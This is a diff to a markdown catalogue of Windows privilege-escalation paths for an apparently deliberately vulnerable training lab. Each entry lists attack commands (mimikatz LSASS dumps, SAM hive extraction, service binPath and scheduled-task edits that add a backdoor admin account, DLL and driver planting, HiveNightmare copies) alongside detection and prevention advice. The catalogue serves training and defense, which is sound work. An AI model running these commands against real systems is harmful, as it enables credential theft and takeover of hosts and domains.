@@ -1,4 +1,4 @@
-# 05 — Privilege Escalation (PE-001..060)
+# 05 — Privilege Escalation (PE-001..128)
 
 Local privilege escalation on Windows. Most paths here assume you have *something* (a low-priv shell, a domain user on a workstation, or a service account on a server). The goal is SYSTEM.
 
@@ -135,65 +135,106 @@ Start-Process "C:\Windows\System32\fodhelper.exe"
 
 ---
 
-### PE-013 — Token Kidnapping (churrasco)
-**What it is:** classic Potato variant; effectively obsolete since 2017 mitigation but lab-injected for completeness.
-**Tools:** `churrasco.exe`.
-**Detection / Prevention:** PE-001.
-
----
-
-### PE-014 — Named Pipe Impersonation
-**What it is:** any service with SeImpersonate that connects to your named pipe → impersonate → SYSTEM.
-**Tools:** `PrintSpoofer`, custom pipe servers.
-**Steps / Detection / Prevention:** PE-001.
-
----
-
-### PE-015 — Service binary overwrite
-**What it is:** writable service binary; replace + restart.
-**Tools:** `icacls`, `sc`.
+### PE-013 — SeDebugPrivilege for Domain Users
+**What it is:** `SeDebugPrivilege` allows a process to debug other processes (e.g. read/write process memory, inject threads). If granted to domain users, any low-privilege user can access LSASS or SYSTEM processes to steal tokens, dump credentials, or inject code.
+**Why it works here:** Granted to Domain Users or specific domain groups via Local Security Policy / GPO on `coruscant`.
+**Tools:** `mimikatz`, `taskmgr`, `procdump`, `whoami`.
 **Steps:**
 ```cmd
-icacls "C:\Program Files\App\app.exe"   :: check write rights
-copy beacon.exe "C:\Program Files\App\app.exe"
-sc start App
+whoami /priv
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+procdump.exe -ma lsass.exe lsass.dmp
 ```
-**Detection:** Event `7040`/file modification of binary path.
-**Prevention:** correct file DACLs; signed-only services.
+**Detection:** Event ID `4673` (Sensitive Privilege Use) for `SeDebugPrivilege`; Sysmon Event ID `10` (ProcessAccess) targeting `lsass.exe`.
+**Prevention:** Restrict `SeDebugPrivilege` strictly to Administrators. Remove any group policies or local settings granting it to non-administrative groups.
 
 ---
 
-### PE-016 — Task Scheduler XML Race
-**What it is:** `%SystemRoot%\System32\Tasks\<task>` XML file is writable by Users → edit Command → next run → SYSTEM.
-**Tools:** `accesschk -uwd`.
-**Detection:** Event `4698` for task modification.
-**Prevention:** tighten Task folder DACL.
+### PE-014 — SeBackupPrivilege for Backup Operators
+**What it is:** `SeBackupPrivilege` grants read-only access to all files on the system, bypassing any file system DACLs. An attacker with this privilege can read sensitive system hives (SAM, SECURITY, SYSTEM) or the Active Directory database (`ntds.dit` on Domain Controllers) to extract passwords/hashes offline.
+**Why it works here:** Domain user `svc_darryl` is in the `Warehouse` group (which is granted backup rights) or assigned `SeBackupPrivilege` on Domain Controllers.
+**Tools:** `wbadmin`, `diskshadow`, `secretsdump`, `robocopy /B`.
+**Steps:**
+```cmd
+reg save HKLM\SAM C:\Temp\sam.hiv /y
+reg save HKLM\SYSTEM C:\Temp\system.hiv /y
+robocopy /B C:\Windows\System32\config C:\Temp sam
+```
+**Detection:** Event ID `4673` for `SeBackupPrivilege`; Event ID `4656`/`4663` targeting the `ntds.dit` or registry hives.
+**Prevention:** Do not assign `SeBackupPrivilege` to non-administrators or non-dedicated backup accounts. Restrict membership in the `Backup Operators` group.
 
 ---
 
-### PE-017 — COM Object Hijacking (PrintNotify)
-**What it is:** PrintNotify COM service implements SeImpersonate-bearing helpers — pipe trick like Potato.
-**Tools:** `PrintNotifyPotato.exe`.
-**Detection / Prevention:** PE-001.
+### PE-015 — Weak Service DACL (svc_dvad_weak)
+**What it is:** The DACL of a service (`svc_dvad_weak`) allows non-administrative users (`Authenticated Users` or `Everyone`) to modify the service configuration (`SERVICE_CHANGE_CONFIG`). Attackers can change the service binary path (`binPath`) to execute their own malicious binary as `SYSTEM` upon service restart.
+**Why it works here:** `svc_dvad_weak` is created with a permissive DACL on `scarif` and `tatooine`.
+**Tools:** `sc.exe`, `accesschk.exe`.
+**Steps:**
+```cmd
+accesschk.exe -uwcqv "Authenticated Users" svc_dvad_weak
+sc config svc_dvad_weak binPath= "cmd /c net user evil P@ss123 /add && net localgroup administrators evil /add"
+sc start svc_dvad_weak
+```
+**Detection:** Event ID `7040` (Service configuration change) in the System log; Sysmon Event ID `13` (RegistryEvent) for changes to `HKLM\System\CurrentControlSet\Services\svc_dvad_weak\ImagePath`.
+**Prevention:** Harden service DACLs. Restrict configuration change rights (`SERVICE_CHANGE_CONFIG` / `SERVICE_ALL_ACCESS`) to administrators.
 
 ---
 
-### PE-018 — Insecure SYSVOL GPO
-**What it is:** GPO `\\empire.local\sysvol\...\Scripts\Startup` writable by Authenticated Users → drop your script → next reboot → SYSTEM.
-**Why it works here:** loose SYSVOL ACLs on a deliberately-misconfigured GPO.
-**Tools:** `SharpGPOAbuse`, `New-GPOImmediateTask`.
+### PE-016 — Writable Scheduled-Task Action
+**What it is:** A scheduled task running as `SYSTEM` runs an action executable or script located in a directory writable by non-administrative users. Attackers can overwrite the script/executable (e.g. `C:\VulnTasks\sync.bat`), triggering execution of their payload in the elevated context.
+**Why it works here:** Scheduled task `CorpSync` runs as `SYSTEM` on tatooine, using script `C:\VulnTasks\sync.bat` which is world-writable.
+**Tools:** `icacls`, `schtasks`.
+**Steps:**
+```cmd
+icacls C:\VulnTasks
+echo net user evil P@ss123 /add > C:\VulnTasks\sync.bat
+echo net localgroup administrators evil /add >> C:\VulnTasks\sync.bat
+schtasks /run /tn "CorpSync"
+```
+**Detection:** Sysmon Event ID `11` (FileCreate) modifying files in `C:\VulnTasks\`; process execution of task child processes under `SYSTEM` executing user-written scripts.
+**Prevention:** Apply strict ACLs on directories containing scheduled task actions. Ensure only administrators can write to those paths.
+
+---
+
+### PE-017 — DLL Hijacking (sql01 / MSSQL Binn)
+**What it is:** A privileged application/service (like MS SQL Server on `kamino`) loads DLLs from its binary directory. If the directory (e.g. `C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn`) is world-writable, a low-privilege user can plant a malicious DLL (like `MSVCR120.dll` or `version.dll`) which will load and execute as `SYSTEM` when the service starts.
+**Why it works here:** The MSSQL `Binn` directory on `kamino` is configured with write permissions for `Everyone`.
+**Tools:** `Process Monitor`, `icacls`.
+**Steps:**
+```cmd
+icacls "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn"
+copy malicious.dll "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\MSVCR120.dll"
+```
+**Detection:** Sysmon Event ID `7` (Image Loaded) loading a DLL from a non-standard or user-writable location into a SYSTEM process.
+**Prevention:** Secure all program directories. Never grant write access to non-administrators on service binary directories.
+
+---
+
+### PE-018 — Loose SYSVOL Scripts DACL
+**What it is:** GPO startup/logon scripts are located in the SYSVOL share. If the DACL on these script directories (e.g., `Machine\Scripts\Startup`) is loosened to allow write/modify permissions to authenticated users, an attacker can modify GPO scripts to run arbitrary code as `SYSTEM` on all computers applying the GPO.
+**Why it works here:** Permissive ACLs are applied to GPO startup script directories in SYSVOL on `coruscant`.
+**Tools:** `SharpGPOAbuse`, `icacls`.
 **Steps:**
 ```powershell
-.\SharpGPOAbuse.exe --AddComputerScript --ScriptName a.bat --ScriptContents "net user evil P@ss /add" --GPOName VulnGPO
+cd \\empire.local\sysvol\empire.local\Policies\{GPO-GUID}\Machine\Scripts\Startup
+echo net user evil P@ss123 /add >> startup.bat
 ```
-**Detection:** Event `5136` GPO edit; SYSVOL file create from non-admin.
-**Prevention:** SYSVOL ACL audit; GPO delegation least-privilege.
+**Detection:** Event ID `5136` (Directory Service Object Modified) or file system events on the Domain Controller's SYSVOL share (Event ID `4663`).
+**Prevention:** Keep default permissions on the SYSVOL folder and GPO paths. Only Domain Admins/Group Policy Creator Owners should have write access.
 
 ---
 
-### PE-019 — Backup Operators → modify GPO files / flag files
-**What it is:** BO has read on system files (PE-005) and write on GPO via inherited rights → modify scripts to run as SYSTEM.
-**Detection / Prevention:** PE-005 + PE-018.
+### PE-019 — SYSTEM-Only Flag Access via SeBackupPrivilege
+**What it is:** Critical files (like flags or database files) are restricted to `SYSTEM` and `Administrators` only. However, users with `SeBackupPrivilege` (e.g. Backup Operators) can read these files by using specialized backup read APIs, bypassing all DACLs.
+**Why it works here:** A flag `C:\Flags\dc-system-only.txt` is created with SYSTEM/Administrators-only permissions on `coruscant`, and can be read by accounts possessing `SeBackupPrivilege`.
+**Tools:** `robocopy /B`, custom backup read scripts (like `sebackup.ps1`).
+**Steps:**
+```cmd
+robocopy /B C:\Flags C:\Temp dc-system-only.txt
+type C:\Temp\dc-system-only.txt
+```
+**Detection:** Event ID `4673` indicating sensitive privilege use for `SeBackupPrivilege`.
+**Prevention:** Apply Tiered Administrative access; do not grant `SeBackupPrivilege` to non-Tier-0 accounts on Tier-0 systems (like Domain Controllers).
 
 ---
 
@@ -240,10 +281,17 @@ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 
 ---
 
-### PE-025 — Token Privilege Exploitation Suite
-**What it is:** custom binary that demonstrates each token privilege’s escalation path (umbrella ID).
-**Tools:** PoC binaries.
-**Detection / Prevention:** as per individual privileges above.
+### PE-025 — Token Privilege Helper and Named Pipe Impersonation
+**What it is:** The `svc_named_pipe` service creates a named pipe. When a higher-privileged client connects to this pipe, a service account with `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` can impersonate the client's token using `ImpersonateNamedPipeClient()`.
+**Why it works here:** `token_helper.exe` and `privileges.txt` are placed in `C:\Tools` on `scarif` and `tatooine` to guide privilege abuse.
+**Tools:** `PrintSpoofer`, `GodPotato`, `RogueWinRM`.
+**Steps:**
+```cmd
+PrintSpoofer.exe -i -c cmd
+GodPotato.exe -cmd "cmd /c whoami"
+```
+**Detection:** Event ID `4624` (Logon Type `3` or `9` with elevated impersonation); Sysmon Event ID `1` for processes spawned by named pipe potato tools.
+**Prevention:** Restrict `SeImpersonatePrivilege` on service accounts. Enable virtual service accounts or managed service accounts with minimized privileges.
 
 ---
 
@@ -262,18 +310,29 @@ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 
 ---
 
-### PE-028 — SeDebugPrivilege → LSASS token steal
-**What it is:** open LSASS, list tokens, impersonate SYSTEM.
-**Tools:** `mimikatz token::elevate`.
-**Detection:** Sysmon `10` LSASS access.
-**Prevention:** Credential Guard.
+### PE-028 — Token Impersonation (SeImpersonatePrivilege)
+**What it is:** Accounts running network services (like IIS AppPool, SQL Server) possess `SeImpersonatePrivilege` by default. If compromised, an attacker can coerce the local `SYSTEM` account (via print spooler, EFS, or WinRM) to authenticate to a local socket or pipe, allowing the service account to impersonate `SYSTEM`.
+**Why it works here:** `SeImpersonatePrivilege` is granted to local service accounts, and `NoLmHash=0` is set to facilitate credential retrieval.
+**Tools:** `GodPotato`, `SweetPotato`, `JuicyPotatoNG`.
+**Steps:**
+```cmd
+GodPotato.exe -cmd "cmd /c whoami"
+```
+**Detection:** Sysmon Event ID `1` process creation where a service account spawns a command shell; Named pipe creation events matching known Potato pipe names.
+**Prevention:** Remove `SeImpersonatePrivilege` from service accounts where possible; restrict service accounts using local security policy.
 
 ---
 
-### PE-029 — SeTakeOwnershipPrivilege
-**What it is:** take ownership of any object; grant yourself GenericAll; modify.
-**Detection:** Event `4670` (permissions changed).
-**Prevention:** restrict; tier admin.
+### PE-029 — User-Writable SYSTEM PATH Entry (%TEMP%)
+**What it is:** The system `%PATH%` variable defines where Windows searches for executables. If a directory writable by non-administrative users (such as `%TEMP%` or `C:\Users\Public`) is appended to the system `%PATH%`, a low-privilege attacker can drop executables there to shadow or hijack execution of system tools run by admins.
+**Why it works here:** `%TEMP%` is appended to the system `%PATH%` on `scarif` and `tatooine`.
+**Tools:** `echo %PATH%`, `icacls`.
+**Steps:**
+```cmd
+copy payload.exe C:\Windows\Temp\taskkill.exe
+```
+**Detection:** Sysmon Event ID `11` (FileCreate) inside temporary/writable directories for executable files; unexpected parent-child process chains.
+**Prevention:** Clean and sanitize the system `%PATH%`. Ensure all directories in the system `%PATH%` are read-only for non-administrators.
 
 ---
 
@@ -480,6 +539,318 @@ See CRED-007/CRED-039.
 **Tools:** `psexec64 -s -i`, mimikatz `token::elevate`.
 **Detection:** unusual TrustedInstaller-launched processes (Sysmon `1`).
 **Prevention:** no practical fix — admin is admin. Tier-0 isolation.
+
+---
+
+### PE-061 — Auto-Run Registry Entry with World-Writable Binary Path
+**What it is:** An auto-run registry key (e.g. under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`) points to a binary in a world-writable directory (like `C:\Tools`). Any local user can replace this binary with a malicious payload, which will execute under the context of any user (including administrators) logging into the system.
+**Why it works here:** `DVADAutorun` points to a world-writable tools directory target.
+**Tools:** `reg query`, `icacls`.
+**Steps:**
+```cmd
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+copy payload.exe C:\Tools\autorun.exe
+```
+**Detection:** Sysmon Event ID `13` (RegistryEvent) modifying `CurrentVersion\Run` values; Sysmon Event ID `11` (FileCreate) modifying the binary.
+**Prevention:** Ensure all applications launched via auto-run reside in write-protected directories (like `C:\Program Files`).
+
+---
+
+### PE-062 — Print Processor DLL Path (World-Writable)
+**What it is:** Print processors are loaded by the Spooler service (`spoolsv.exe`) which runs as `SYSTEM`. If the print processor directory or registry entry is writable by non-admins, an attacker can register or drop a malicious print processor DLL to execute code as `SYSTEM`.
+**Why it works here:** The print processor folder or registry key has loose permissions.
+**Tools:** `reg add`, `sc`.
+**Steps:**
+```cmd
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\EvilProcessor" /v Driver /t REG_SZ /d "evil_processor.dll" /f
+sc stop spooler && sc start spooler
+```
+**Detection:** Sysmon Event ID `7` (Image Loaded) loading print processor DLLs from unexpected paths; Event ID `13` registry modification under `Control\Print`.
+**Prevention:** Limit print configuration rights. Ensure the spooler environments folder is strictly write-protected.
+
+---
+
+### PE-063 — LSA Notification Package (World-Writable DLL)
+**What it is:** LSA notification packages are DLLs loaded by the Local Security Authority Subsystem Service (`lsass.exe`) at startup. They have access to plaintext passwords when users authenticate. If an attacker has write access to the registry key or the folder where LSA packages are stored, they can register a malicious package (`dvad_notify`) to escalate privileges and dump credentials.
+**Why it works here:** `dvad_notify` is added to LSA Notification Packages in `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`.
+**Tools:** `reg query`, `copy`.
+**Steps:**
+```cmd
+reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Notification Packages"
+copy dvad_notify.dll C:\Windows\System32\
+```
+**Detection:** Event ID `4624` / `4611` (Trusted Logon Process Registered); Sysmon Event ID `7` (`lsass.exe` loading unsigned notification DLLs).
+**Prevention:** Only allow signed LSA plugins; enable LSA Protection (`RunAsPPL=1`).
+
+---
+
+### PE-064 — Security Support Provider (Custom SSP)
+**What it is:** Security Support Providers (SSPs) are DLLs loaded by LSA. An attacker with administrative privileges or write access to the registry can add a custom SSP DLL to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` to capture plaintext credentials during user logon.
+**Why it works here:** A custom SSP configuration is permitted or registered.
+**Tools:** `reg add`, `mimikatz`.
+**Steps:**
+```cmd
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "mimilib\0" /f
+```
+**Detection:** Sysmon Event ID `7` (`lsass.exe` loading an unusual DLL); Registry modifications under `Lsa\Security Packages`.
+**Prevention:** Turn on LSA Protection (`RunAsPPL`); restrict registry write access to LSA keys.
+
+---
+
+### PE-065 — MachineKeys Directory World-Readable (DPAPI)
+**What it is:** The `C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys` directory stores pair keys for the local machine. If the DACL is overly permissive (world-readable), local users can read private keys used by services (IIS, SQL, VPN), which allows them to decrypt DPAPI-protected secrets or impersonate local services.
+**Why it works here:** The MachineKeys directory is configured to be world-readable.
+**Tools:** `icacls`, `mimikatz`.
+**Steps:**
+```cmd
+icacls C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys
+```
+**Detection:** File access auditing on `MachineKeys` folder; unexpected read events by non-administrative users.
+**Prevention:** Keep default system permissions on Crypto directories. Restrict read access to SYSTEM and Administrators.
+
+---
+
+### PE-066 — Cached Credentials in DPAPI User Master Key
+**What it is:** DPAPI (Data Protection API) encrypts secrets using user master keys. If a user's master key is compromised (or cached credential keys are extracted from registry/memory), an attacker can decrypt cached browser passwords, credentials stored in Credential Manager, or Outlook passwords.
+**Why it works here:** Cached credentials or weak master keys are stored.
+**Tools:** `mimikatz`.
+**Steps:**
+```cmd
+mimikatz "privilege::debug" "dpapi::credentials" exit
+```
+**Detection:** Access to `AppData\Roaming\Microsoft\Protect\` directories by unusual processes.
+**Prevention:** Enable Credential Guard; restrict access to LSASS memory where master keys are cached.
+
+---
+
+### PE-067 — CredentialGuard Disabled
+**What it is:** Credential Guard uses virtualization-based security (VBS) to isolate LSASS secrets (such as NTLM password hashes and Kerberos Ticket Granting Tickets) in a secure container. If disabled, these secrets remain in the memory of the user-mode `lsass.exe` process and can be extracted.
+**Why it works here:** `EnableVirtualizationBasedSecurity` and `LsaCfgFlags` are explicitly set to `0` to disable Credential Guard in this lab.
+**Tools:** `reg query`, `mimikatz`.
+**Steps:**
+```cmd
+reg query HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard /v EnableVirtualizationBasedSecurity
+mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
+```
+**Detection:** Event ID `4624` (LSA isolation checks); Group Policy compliance checks.
+**Prevention:** Deploy VBS and enable Credential Guard via GPO (`Turn On Virtualization Based Security`).
+
+---
+
+### PE-068 — Secure Boot Disabled (CSM mode — boot-level attack)
+**What it is:** Secure Boot ensures that only trusted, signed firmware and boot loaders can execute. If disabled (or Compatibility Support Module / CSM mode is enabled), an attacker with physical or local system access can install a malicious bootloader (bootkit) to patch the kernel and bypass OS security controls at boot.
+**Why it works here:** Secure Boot is disabled in firmware configuration.
+**Tools:** `Confirm-SecureBootUEFI` (PowerShell).
+**Steps:**
+```powershell
+Confirm-SecureBootUEFI
+```
+**Detection:** Firmware signature validation failures; modified EFI partition files.
+**Prevention:** Enable UEFI Secure Boot in system BIOS/UEFI settings and disable CSM.
+
+---
+
+### PE-069 — BitLocker Not Enabled (Cold Boot / Hibernation Attack)
+**What it is:** Without full disk encryption (BitLocker), the storage media is unprotected when powered off. An attacker with physical access (or VM disk access) can read/write directly to the disk, extract the SAM database, alter system files, or perform cold boot/hibernation file extraction to steal keys.
+**Why it works here:** BitLocker is disabled on VM system drives.
+**Tools:** `manage-bde`, VM disk mount.
+**Steps:**
+```powershell
+manage-bde -status
+```
+**Detection:** Physical device tamper indicators; unauthorized mounting of storage media.
+**Prevention:** Force BitLocker encryption on all operating system and data drives.
+
+---
+
+### PE-070 — SAM/SYSTEM Registry Backup Accessible
+**What it is:** Periodic registry backups of SAM, SECURITY, and SYSTEM hives are created. If these backups are stored in a world-readable directory (e.g. `C:\Tools\backup\`), any local user can copy them and decrypt local account password hashes.
+**Why it works here:** Registry hives SAM and SYSTEM are saved in `C:\Tools\backup\` with permissive read permissions.
+**Tools:** `secretsdump`, `copy`.
+**Steps:**
+```cmd
+copy C:\Tools\backup\sam.hiv C:\Temp\
+copy C:\Tools\backup\system.hiv C:\Temp\
+impacket-secretsdump -sam C:\Temp\sam.hiv -system C:\Temp\system.hiv LOCAL
+```
+**Detection:** Sysmon Event ID `11` (FileCreate) saving registry hives to world-readable directories; file access logs.
+**Prevention:** Restrict backup paths. Do not save registry hives to shared folders or directories accessible by non-administrators.
+
+---
+
+### PE-081..100 — Secedit Privilege Grants / Token Privilege Abuse Surfaces
+**What it is:** To simulate privilege escalation paths, various user accounts and local groups are granted powerful token privileges via local policy security databases (`secedit`). These privileges (such as `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeRestorePrivilege`, and `SeLoadDriverPrivilege`) enable direct escalation to `SYSTEM`.
+**Why it works here:** Secedit templates configure these assignments across Windows hosts in the lab.
+**Tools:** `secedit`, `whoami /priv`, `PrintSpoofer`, `GodPotato`.
+**Steps:**
+```cmd
+whoami /priv
+secedit /export /cfg C:\Temp\gp.inf /areas USER_RIGHTS
+```
+**Detection:** Event ID `4704` (User Right Assigned); Event ID `4673` (Sensitive Privilege Use).
+**Prevention:** Regularly audit User Rights Assignments. Revert any unauthorized local policy overrides and centralize privileges via domain Group Policies.
+
+---
+
+### PE-101 — Vulnerable Kernel Driver Loading
+**What it is:** `SeLoadDriverPrivilege` allows non-admins to load third-party kernel drivers. An attacker can load a signed-but-vulnerable driver (BYOVD) to gain arbitrary kernel write primitives and patch the running OS memory (e.g. elevate their process token to `SYSTEM`).
+**Why it works here:** `SeLoadDriverPrivilege` is assigned, and indicator notes are dropped.
+**Tools:** `KDU`, `EDRSandblast`, `sc`.
+**Steps:**
+```cmd
+sc.exe create RTCore64 binpath= "C:\Tools\RTCore64.sys" type= kernel
+sc.exe start RTCore64
+```
+**Detection:** Event ID `7045` (Service Creation) with Type `Kernel Driver`; Sysmon Event ID `6` (Driver Loaded).
+**Prevention:** Enable Hypervisor-Protected Code Integrity (HVCI) and Driver Blocklist.
+
+---
+
+### PE-110 — Hypervisor / Virtual Firmware PE
+**What it is:** Vulnerabilities in virtualization hypervisors (QEMU, VirtualBox, Hyper-V) allow a guest VM user to escape virtualization boundaries and execute code on the host machine.
+**Why it works here:** Theoretical escape indicators are dropped for research reference.
+**Tools:** Hypervisor escape PoCs.
+**Steps:**
+```cmd
+# Trigger hypervisor specific vulnerabilities (e.g. CVE-2024-38080 or historical QEMU escapes)
+# to execute code inside the host system context.
+```
+**Detection:** VM process crashes on the host; anomalous process behaviors or network traffic originating from the hypervisor process.
+**Prevention:** Keep hypervisor software fully patched; disable unused virtual devices (e.g., floppy drives, CD-ROMs); use nested virtualization restrictions.
+
+---
+
+### PE-115 — BYOVD Vulnerable Driver Reference
+**What it is:** A collection of commonly abused vulnerable signed drivers (e.g. `RTCore64.sys`, `dbutil_2_3.sys`, `mhyprot2.sys`) that are used in Bring-Your-Own-Vulnerable-Driver attacks to bypass EDR/AV security controls.
+**Why it works here:** Reference notes are dropped at `C:\Flags\FLAG-PE-115-VulnDriverList.txt`.
+**Tools:** LOLDrivers database.
+**Steps:**
+```cmd
+# Reference the list of known vulnerable driver hashes from LOLDrivers database:
+# https://www.loldrivers.io/
+```
+**Detection:** Sysmon Event ID `6` driver loads matching hashes of known vulnerable drivers.
+**Prevention:** Restrict driver loading to signed drivers matching the Microsoft Recommended Driver Blocklist.
+
+---
+
+### PE-123 — LAPS Not Deployed
+**What it is:** Local Administrator Password Solution (LAPS) is not used. Consequently, a single uniform password is set for the local Administrator account across all workstations and servers. Compromise of a single host enables immediate lateral movement to all other hosts.
+**Why it works here:** No LAPS is deployed, and all VMs use the same local Administrator password.
+**Tools:** `netexec`, `evil-winrm`, `impacket-wmiexec`.
+**Steps:**
+```bash
+nxc smb 10.10.0.0/24 -u Administrator -p 'SithLord123!' --local-auth
+```
+**Detection:** Event ID `4624` Logon Type 3 across multiple systems using the same local Administrator account within a short timeframe.
+**Prevention:** Implement Microsoft LAPS to randomize and automatically rotate local Administrator passwords on every system.
+
+---
+
+### PE-126 — Protected Users Group is Empty
+**What it is:** The "Protected Users" group is an AD security group that enforces strict security controls (e.g. no NTLM auth cached, 4-hour TGT lifetime, Kerberos-only). If left empty, high-privilege accounts (Domain Admins) are susceptible to credential harvesting from LSASS memory.
+**Why it works here:** The Protected Users group is left empty.
+**Tools:** `mimikatz`, `secretsdump`.
+**Steps:**
+```cmd
+net group "Protected Users" /domain
+mimikatz "sekurlsa::logonpasswords" exit
+```
+**Detection:** Success of NTLM authentication by Domain Admin accounts; long Kerberos ticket lifetimes.
+**Prevention:** Add all high-privilege administration accounts (Domain Admins, Enterprise Admins) to the Protected Users security group.
+
+---
+
+### PE-128 — developer2 GenericWrite on Enterprise Admins
+**What it is:** A low-privilege domain user has `GenericWrite` rights over the `Enterprise Admins` group. This allows the user to add themselves or any other user to the group, resulting in complete forest-wide compromise.
+**Why it works here:** `developer2` is granted `GenericWrite` on the `Enterprise Admins` group.
+**Tools:** `PowerView`, `ActiveDirectory` PowerShell module.
+**Steps:**
+```powershell
+Add-ADGroupMember -Identity "Enterprise Admins" -Members "developer2"
+```
+**Detection:** Event ID `4728` (A member was added to a security-enabled global group) targeting "Enterprise Admins".
+**Prevention:** Maintain strict ACLs on administrative groups. Audit group delegation rights using tools like BloodHound.
+
+---
+
+### CVE-2021-36934 — HiveNightmare / SeriousSAM
+**What it is:** Windows sets weak ACLs on the `SAM`, `SECURITY`, and `SYSTEM` registry hive files, allowing local non-admin users to read them. Combined with Volume Shadow Copy (VSS), users can read files from shadow copies to retrieve local account hashes.
+**Why it works here:** Permissive read permissions (`BUILTIN\Users:R`) are set on `C:\Windows\System32\config\SAM` on `tatooine`.
+**Tools:** `HiveNightmare.exe`, `secretsdump`.
+**Steps:**
+```cmd
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\sam
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\system
+impacket-secretsdump -sam C:\Temp\sam -system C:\Temp\system LOCAL
+```
+**Detection:** Event ID `4663` targeting the configuration registry hives from non-admin accounts.
+**Prevention:** Apply Microsoft patch KB5005033. Correct ACLs: `icacls C:\Windows\System32\config\*.* /inheritance:e`.
+
+---
+
+### CVE-2023-36874 — Windows Error Reporting LPE
+**What it is:** Windows Error Reporting (WER) allows a local user to escalate privileges by abusing a directory junction/path traversal vulnerability when WER creates error reports.
+**Why it works here:** The WER service (`WerSvc`) is enabled and its `LocalDumps` path is pointed to a world-writable location `C:\Tools\dumps`.
+**Tools:** public PoC.
+**Steps:**
+```cmd
+# Abuse the path traversal inside the world-writable dumps directory to write files as SYSTEM.
+```
+**Detection:** EDR/AV detections for WER exploits; creation of unexpected files by `WerSvc.exe`.
+**Prevention:** Apply Microsoft patches from July 2023.
+
+---
+
+### CVE-2024-26230 — Telephony Service LPE / TapiSrv
+**What it is:** The Windows Telephony Service (`TapiSrv`) runs as `LocalSystem` and can be coerced to load unsigned DLLs from its search path, leading to local privilege escalation.
+**Why it works here:** `TapiSrv` is enabled on `scarif` to expose this attack surface.
+**Tools:** DLL planting PoC.
+**Steps:**
+```cmd
+sc.exe start TapiSrv
+```
+**Detection:** Sysmon Event ID `7` (Image Loaded) loading unsigned DLLs under `TapiSrv` process context.
+**Prevention:** Apply Windows updates from April 2024.
+
+---
+
+### CVE-2021-1732 — Win32k Privilege Escalation
+**What it is:** A win32k console window handle use-after-free vulnerability that allows a local user to execute arbitrary code with kernel privileges.
+**Why it works here:** Tatooine runs an unpatched version of Windows Server 2019/Windows 10.
+**Tools:** public exploit binaries.
+**Steps:**
+```cmd
+CVE-2021-1732.exe
+```
+**Detection:** Event ID `4688` (Process Creation) spawned by exploit; EDR signature detections.
+**Prevention:** Apply Microsoft patch from February 2021.
+
+---
+
+### CVE-2024-38080 — Hyper-V LPE
+**What it is:** An integer overflow vulnerability in Windows Hyper-V that allows a local attacker to execute code as `SYSTEM`.
+**Why it works here:** Unpatched Hyper-V installations (reference notes dropped).
+**Tools:** public exploit binaries.
+**Steps:**
+```cmd
+# Execute the exploit binary inside a Hyper-V guest or host VM.
+```
+**Detection:** EDR alert; unexpected system crashes (BSOD) during exploit attempts.
+**Prevention:** Apply July 2024 security updates.
+
+---
+
+### CVE-2025-21333 — Windows Hyper-V NT Kernel LPE
+**What it is:** A heap overflow vulnerability in the Hyper-V NT Kernel Integration VSP driver that allows guest-to-host breakout or local privilege escalation.
+**Why it works here:** Unpatched systems in the lab.
+**Tools:** public escape exploits.
+**Steps:**
+```cmd
+# Run guest escape exploit tool on target.
+```
+**Detection:** anomalous kernel drivers or process executions outside VM boundaries.
+**Prevention:** Apply January 2025 security updates.
 
 ---
 
